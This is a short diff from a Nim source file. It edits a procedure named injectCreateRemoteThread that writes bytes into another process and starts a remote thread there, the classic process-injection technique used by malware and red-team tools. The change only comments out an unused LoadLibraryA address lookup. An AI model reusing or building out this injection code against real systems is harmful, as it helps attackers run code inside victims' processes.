@@ -47,7 +47,7 @@ proc injectCreateRemoteThread(name: string): void =
     echo "    \\-- bytes written: ", bytesWritten
     echo ""
 
-    var loadLibraryAddress = cast[LPVOID](GetProcAddress(GetModuleHandle(r"kernel32.dll"), r"LoadLibraryA"))
+    #var loadLibraryAddress = cast[LPVOID](GetProcAddress(GetModuleHandle(r"kernel32.dll"), r"LoadLibraryA")) //We actually dont need this in NIM.
 
     let tHandle = CreateRemoteThread(
         pHandle, 
